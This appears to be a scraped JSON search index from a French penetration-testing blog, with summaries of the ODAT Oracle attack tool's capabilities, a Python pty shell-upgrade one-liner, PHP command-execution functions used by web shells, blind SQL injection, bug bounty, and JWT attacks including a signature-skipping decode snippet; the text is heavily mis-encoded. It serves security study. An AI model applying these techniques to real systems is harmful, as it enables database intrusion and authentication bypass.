via¬†: une attaque par dictionnaire une attaque par force brute ALIAS de l\u0026rsquo;auditeur rechercher des comptes¬†Oracle¬†en utilisant¬†: une attaque par dictionnaire chaque utilisateur Oracle aime le mot de passe (besoin d\u0026rsquo;un compte avant d\u0026rsquo;utiliser cette attaque) ex√©cuter des commandes syst√®me¬†sur le serveur de base de donn√©es en utilisant¬†: DBMS_SCHEDULER JAVA tables externes oradbg t√©l√©charger les fichiers¬†stock√©s sur le serveur de base de donn√©es en utilisant¬†: FICHIER_UTL DBMS_XSLPROCESSOR tables externes CTXSYS DBMS_LOB t√©l√©charger des fichiers¬†sur le serveur de base de donn√©es en utilisant¬†: FICHIER_UTL DBMS_XSLPROCESSOR DBMS_ADVISOR supprimer des fichiers¬†en utilisant¬†: FICHIER_UTL obtenez un acc√®s privil√©gi√©¬†en utilisant les combinaisons de privil√®ges syst√®me suivantes (voir l\u0026rsquo;aide pour les commandes du module¬†privesc¬†)¬†: CR√âER N\u0026rsquo;IMPORTE QUELLE PROC√âDURE CR√âER UNE PROC√âDURE et EX√âCUTER N\u0026rsquo;IMPORTE QUELLE PROC√âDURE CR√âER N\u0026rsquo;IMPORTE QUEL D√âCLENCHEUR (ET CR√âER UNE PROC√âDURE) ANALYSER TOUT (ET CR√âER UNE PROC√âDURE) CR√âER N\u0026rsquo;IMPORTE QUEL INDEX (ET CR√âER UNE PROC√âDURE) envoyer/recevoir des requ√™tes HTTP¬†depuis le serveur de base de donn√©es en utilisant¬†: UTL_HTTP HttpUriType scanner les ports¬†du serveur local ou d\u0026rsquo;un serveur distant en utilisant¬†: UTL_HTTP HttpUriType UTL_TCP capturer une authentification SMB¬†via¬†: un index afin de d√©clencher une connexion SMB exploiter certains CVE : la¬†CVE-2012-3137 r√©cup√©rer la cl√© de session et le sel pour des utilisateurs arbitraires attaque par dictionnaire sur les sessions le¬†CVE-2012-????¬†: Un utilisateur authentifi√© peut modifier toutes les tables qu\u0026rsquo;il peut s√©lectionner m√™me s\u0026rsquo;il ne peut pas les modifier normalement (pas de privil√®ge ALTER). l\u0026rsquo; attaque¬†CVE-2012-1675¬†(alias attaque par empoisonnement TNS) rechercher dans les noms de colonnes¬†gr√¢ce au module¬†de recherche¬†: rechercher un mod√®le (ex¬†: mot de passe) dans les noms de colonnes d√©baller¬†le code source PL/SQL (10g/11g et 12c) Obtenir les privil√®ges¬†et les r√¥les¬†syst√®me¬†accord√©s¬†. Il est √©galement possible d\u0026rsquo;obtenir les privil√®ges et les r√¥les des r√¥les accord√©s. ex√©cuter des requ√™tes SELECT arbitraires (alias shell SQL minimal) documentation : https://github.com/quentinhardy/odat/wiki\nhttps://www.kali.org/tools/odat/\n","permalink":"https://nyobemichel.me/posts/outils/odat/","summary":"\u003cp\u003eun outil de test de p√©n√©tration open source qui teste la s√©curit√© des bases de donn√©es Oracle √† distance.\nGr√¢ce √† ODAT, vous pouvez :\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003erechercher¬†\u003cstrong\u003eun SID valide\u003c/strong\u003e¬†sur un √©couteur de base de donn√©es Oracle distant via¬†:\n\u003cul\u003e\n\u003cli\u003eune attaque par dictionnaire\u003c/li\u003e\n\u003cli\u003eune attaque par force brute\u003c/li\u003e\n\u003cli\u003eALIAS de l\u0026rsquo;auditeur\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003erechercher des comptes\u003c/strong\u003e¬†Oracle¬†en utilisant¬†:\n\u003cul\u003e\n\u003cli\u003eune attaque par dictionnaire\u003c/li\u003e\n\u003cli\u003echaque utilisateur Oracle aime le mot de passe (besoin d\u0026rsquo;un compte avant d\u0026rsquo;utiliser cette attaque)\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eex√©cuter des commandes syst√®me\u003c/strong\u003e¬†sur le serveur de base de donn√©es en utilisant¬†:\n\u003cul\u003e\n\u003cli\u003eDBMS_SCHEDULER\u003c/li\u003e\n\u003cli\u003eJAVA\u003c/li\u003e\n\u003cli\u003etables externes\u003c/li\u003e\n\u003cli\u003eoradbg\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003et√©l√©charger les fichiers\u003c/strong\u003e¬†stock√©s sur le serveur de base de donn√©es en utilisant¬†:\n\u003cul\u003e\n\u003cli\u003eFICHIER_UTL\u003c/li\u003e\n\u003cli\u003eDBMS_XSLPROCESSOR\u003c/li\u003e\n\u003cli\u003etables externes\u003c/li\u003e\n\u003cli\u003eCTXSYS\u003c/li\u003e\n\u003cli\u003eDBMS_LOB\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003et√©l√©charger des fichiers\u003c/strong\u003e¬†sur le serveur de base de donn√©es en utilisant¬†:\n\u003cul\u003e\n\u003cli\u003eFICHIER_UTL\u003c/li\u003e\n\u003cli\u003eDBMS_XSLPROCESSOR\u003c/li\u003e\n\u003cli\u003eDBMS_ADVISOR\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003esupprimer des fichiers\u003c/strong\u003e¬†en utilisant¬†:\n\u003cul\u003e\n\u003cli\u003eFICHIER_UTL\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eobtenez un acc√®s privil√©gi√©\u003c/strong\u003e¬†en utilisant les combinaisons de privil√®ges syst√®me suivantes (voir l\u0026rsquo;aide pour les commandes du module¬†\u003cem\u003eprivesc\u003c/em\u003e¬†)¬†:\n\u003cul\u003e\n\u003cli\u003eCR√âER N\u0026rsquo;IMPORTE QUELLE PROC√âDURE\u003c/li\u003e\n\u003cli\u003eCR√âER UNE PROC√âDURE et EX√âCUTER N\u0026rsquo;IMPORTE QUELLE PROC√âDURE\u003c/li\u003e\n\u003cli\u003eCR√âER N\u0026rsquo;IMPORTE QUEL D√âCLENCHEUR (ET CR√âER UNE PROC√âDURE)\u003c/li\u003e\n\u003cli\u003eANALYSER TOUT (ET CR√âER UNE PROC√âDURE)\u003c/li\u003e\n\u003cli\u003eCR√âER N\u0026rsquo;IMPORTE QUEL INDEX (ET CR√âER UNE PROC√âDURE)\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eenvoyer/recevoir des requ√™tes HTTP\u003c/strong\u003e¬†depuis le serveur de base de donn√©es en utilisant¬†:\n\u003cul\u003e\n\u003cli\u003eUTL_HTTP\u003c/li\u003e\n\u003cli\u003eHttpUriType\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003escanner les ports\u003c/strong\u003e¬†du serveur local ou d\u0026rsquo;un serveur distant en utilisant¬†:\n\u003cul\u003e\n\u003cli\u003eUTL_HTTP\u003c/li\u003e\n\u003cli\u003eHttpUriType\u003c/li\u003e\n\u003cli\u003eUTL_TCP\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ecapturer une authentification SMB\u003c/strong\u003e¬†via¬†:\n\u003cul\u003e\n\u003cli\u003eun index afin de d√©clencher une connexion SMB\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eexploiter certains CVE :\n\u003cul\u003e\n\u003cli\u003ela¬†\u003ca href=\"http://cvedetails.com/cve/2012-3137\"\u003e\u003cstrong\u003eCVE-2012-3137\u003c/strong\u003e\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003er√©cup√©rer la cl√© de session et le sel pour des utilisateurs arbitraires\u003c/li\u003e\n\u003cli\u003eattaque par dictionnaire sur les sessions\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003ele¬†\u003ca href=\"https://twitter.com/gokhanatil/status/595853921479991297\"\u003e\u003cstrong\u003eCVE-2012-????\u003c/strong\u003e\u003c/a\u003e¬†: Un utilisateur authentifi√© peut modifier toutes les tables qu\u0026rsquo;il peut s√©lectionner m√™me s\u0026rsquo;il ne peut pas les modifier normalement (pas de privil√®ge ALTER).\u003c/li\u003e\n\u003cli\u003el\u0026rsquo; attaque¬†\u003ca href=\"http://seclists.org/fulldisclosure/2012/Apr/204\"\u003e\u003cstrong\u003eCVE-2012-1675\u003c/strong\u003e\u003c/a\u003e¬†(alias attaque par empoisonnement TNS)\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003erechercher dans les noms de colonnes\u003c/strong\u003e¬†gr√¢ce au module¬†\u003cem\u003ede recherche\u003c/em\u003e¬†:\n\u003cul\u003e\n\u003cli\u003erechercher un mod√®le (ex¬†: mot de passe) dans les noms de colonnes\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ed√©baller\u003c/strong\u003e¬†le code source PL/SQL (10g/11g et 12c)\u003c/li\u003e\n\u003cli\u003eObtenir les privil√®ges¬†et les r√¥les¬†\u003cstrong\u003esyst√®me\u003c/strong\u003e¬†\u003cstrong\u003eaccord√©s\u003c/strong\u003e¬†. Il est √©galement possible d\u0026rsquo;obtenir les privil√®ges et les r√¥les des r√¥les accord√©s.\u003c/li\u003e\n\u003cli\u003eex√©cuter des requ√™tes SELECT arbitraires (alias shell SQL minimal)\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003edocumentation : \u003ca href=\"https://github.com/quentinhardy/odat/wiki\"\u003ehttps://github.com/quentinhardy/odat/wiki\u003c/a\u003e\u003c/p\u003e","title":""},{"content":"python -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/sh\u0026#34;)\u0026#39; G√©n√©ration de Shell interactifs Qu\u0026rsquo;est-ce qu\u0026rsquo;un Web Shell ? https://attack.mitre.org/techniques/T1505/003/ Les fonctions d\u0026rsquo;ex√©cution syst√®me en PHP , telles que shell_exec(), exec(), system()et passthru(), peuvent √™tre utilis√©es abusivement pour obtenir l\u0026rsquo;ex√©cution de commandes.\n","permalink":"https://nyobemichel.me/posts/penetrationtesting/shells--payloads/","summary":"\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell-session\" data-lang=\"shell-session\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"go\"\u003epython -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/sh\u0026#34;)\u0026#39; \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch1 id=\"g√©n√©ration-de-shell-interactifs\"\u003eG√©n√©ration de Shell interactifs\u003c/h1\u003e\n\u003ch2 id=\"quest-ce-quun-web-shell-\"\u003eQu\u0026rsquo;est-ce qu\u0026rsquo;un Web Shell ?\u003c/h2\u003e\n\u003cp\u003e\u003ca href=\"https://attack.mitre.org/techniques/T1505/003/\"\u003ehttps://attack.mitre.org/techniques/T1505/003/\u003c/a\u003e\nLes fonctions d\u0026rsquo;ex√©cution syst√®me en PHP , telles que shell_exec(), exec(), system()et passthru(), peuvent √™tre utilis√©es abusivement pour obtenir l\u0026rsquo;ex√©cution de commandes.\u003c/p\u003e","title":""},{"content":"L\u0026rsquo;injection SQL aveugle se produit lorsqu\u0026rsquo;une application est vuln√©rable √† l\u0026rsquo;injection SQL, mais ses r√©ponses HTTP ne contiennent pas les r√©sultats de la requ√™te SQL pertinente ni les d√©tails des erreurs de base de donn√©es.\n","permalink":"https://nyobemichel.me/posts/web/blind-sql-injection/","summary":"\u003cp\u003eL\u0026rsquo;injection SQL aveugle se produit lorsqu\u0026rsquo;une application est vuln√©rable √† l\u0026rsquo;injection SQL, mais ses r√©ponses HTTP ne contiennent pas les r√©sultats de la requ√™te SQL pertinente ni les d√©tails des erreurs de base de donn√©es.\u003c/p\u003e","title":""},{"content":"D√©finition et concept de base Un programme de prime aux bugs est un programme propos√© par les organisations pour inciter les hackers √©thiques √† identifier et √† divulguer de mani√®re responsable les vuln√©rabilit√©s de leurs actifs num√©riques. Au lieu d\u0026rsquo;attendre que des acteurs malveillants exploitent des failles inconnues, les entreprises paient des chercheurs externes pour les signaler en premier.\n","permalink":"https://nyobemichel.me/posts/web/bug-bounty/","summary":"\u003ch3 id=\"d√©finition-et-concept-de-base\"\u003e\u003cstrong\u003eD√©finition et concept de base\u003c/strong\u003e\u003c/h3\u003e\n\u003cp\u003eUn programme de prime aux bugs est un programme propos√© par les organisations pour inciter les hackers √©thiques √† identifier et √† divulguer de mani√®re responsable les vuln√©rabilit√©s de leurs actifs num√©riques. Au lieu d\u0026rsquo;attendre que des acteurs malveillants exploitent des failles inconnues, les entreprises paient des chercheurs externes pour les signaler en premier.\u003c/p\u003e","title":""},{"content":"","permalink":"https://nyobemichel.me/posts/web/intro-to-graphql-hacking/","summary":"","title":""},{"content":"JWT ( json web token )\n![[Pasted image 20250707104217.png]]\nLes JWT √©tant principalement utilis√©s dans les m√©canismes d\u0026rsquo;authentification, de gestion de session et de contr√¥le d\u0026rsquo;acc√®s\nLa sp√©cification JWT est √©tendue par les sp√©cifications JSON Web Signature (JWS) et JSON Web Encryption (JWE), qui d√©finissent des m√©thodes concr√®tes d\u0026rsquo;impl√©mentation des JWT. L\u0026rsquo;un des types de jetons les plus courants est le jeton Web¬†JSON¬†(JWT), qui est transmis via l\u0026rsquo;¬†Authorization: Beareren-t√™te. Les JWT sont des jetons autonomes permettant de transmettre des informations de session de mani√®re s√©curis√©e.\nVous trouverez ci-dessous les deux requ√™tes cURL permettant d\u0026rsquo;interagir avec l\u0026rsquo;¬†API¬†. Pour l\u0026rsquo;authentification, la requ√™te cURL suivante peut √™tre effectu√©e¬†:\ncurl -H \u0026#39;Content-Type: application/json\u0026#39; -X POST -d \u0026#39;{ \u0026#34;username\u0026#34; : \u0026#34;user\u0026#34;, \u0026#34;password\u0026#34; : \u0026#34;passwordX\u0026#34; }\u0026#39; http://MACHINE_IP/api/v1.0/exampleX curl -H \u0026#39;Authorization: Bearer [JWT token]\u0026#39; http://MACHINE_IP/api/v1.0/example2?username=Y Structure de JWT Un JWT se compose de trois composants, chacun cod√© en Base64Url et s√©par√© par des points¬†: Header¬†- L\u0026rsquo;en-t√™te indique g√©n√©ralement le type de jeton, qui est JWT, ainsi que l\u0026rsquo;algorithme de signature utilis√©. Payload la charge utile est le corps du jeton, qui contient les revendications. Une revendication est une information fournie pour une entit√© sp√©cifique. Signature la signature est la partie du jeton qui fournit une m√©thode pour v√©rifier son authenticit√©.\nAlgorithmes de signature Aucun signature symetrique : HS256, signature asymetrique : RS256\nNe pas v√©rifier la signature Le premier probl√®me avec la validation de signature survient en l\u0026rsquo;absence de validation. Si le serveur ne v√©rifie pas la signature du JWT, il est possible de modifier les revendications du JWT selon vos pr√©f√©rences.\npayload = jwt.decode(token, options={\u0026#39;verify_signature\u0026#39;: False}) La solution\nLe JWT doit toujours √™tre v√©rifi√© ou des facteurs d\u0026rsquo;authentification suppl√©mentaires, tels que des certificats, doivent √™tre utilis√©s pour les communications de serveur √† serveur. Le JWT peut √™tre v√©rifi√© en fournissant la cl√© secr√®te (ou publique), comme illustr√© dans l\u0026rsquo;exemple ci-dessous¬†:\nPayload = jwt.decode(token, self.secret, algorithms=\u0026#34;HS256\u0026#34;) Travailler avec des JWT dans Burp Suite Vous pouvez utiliser Burp Inspector pour visualiser et d√©coder les JWT. Vous pouvez ensuite utiliser l\u0026rsquo;extension JWT Editor pour¬†:\nG√©n√©rer des cl√©s de signature cryptographiques. Modifiez le JWT. R√©signez le jeton avec une signature valide qui correspond au JWT modifi√©. https://jwt.io/ https://datatracker.ietf.org/doc/html/rfc7519 https://gchq.github.io/CyberChef/ https://docs.github.com/fr/enterprise-cloud@latest/apps/creating-github-apps/authenticating-with-a-github-app/generating-a-json-web-token-jwt-for-a-github-app https://portswigger.net/burp/documentation/desktop/testing-workflow/session-management/jwts\n","permalink":"https://nyobemichel.me/posts/web/jwt-attacks/","summary":"\u003cp\u003eJWT ( json web token )\u003c/p\u003e\n\u003cp\u003e![[Pasted image 20250707104217.png]]\u003c/p\u003e\n\u003cp\u003eLes JWT √©tant principalement utilis√©s dans les m√©canismes d\u0026rsquo;authentification, de gestion de session et de contr√¥le d\u0026rsquo;acc√®s\u003c/p\u003e\n\u003cp\u003eLa sp√©cification JWT est √©tendue par les sp√©cifications JSON Web Signature (JWS) et JSON Web Encryption (JWE), qui d√©finissent des m√©thodes concr√®tes d\u0026rsquo;impl√©mentation des JWT.\nL\u0026rsquo;un des types de jetons les plus courants est le jeton Web¬†JSON¬†(JWT), qui est transmis via l\u0026rsquo;¬†\u003ccode\u003eAuthorization: Bearer\u003c/code\u003een-t√™te.\nLes JWT sont des jetons autonomes permettant de transmettre des informations de session de mani√®re s√©curis√©e.\u003c/p\u003e","title":""},{"content":"","permalink":"https://nyobemichel.me/posts/web/sql-attack/","summary":"","title":""}]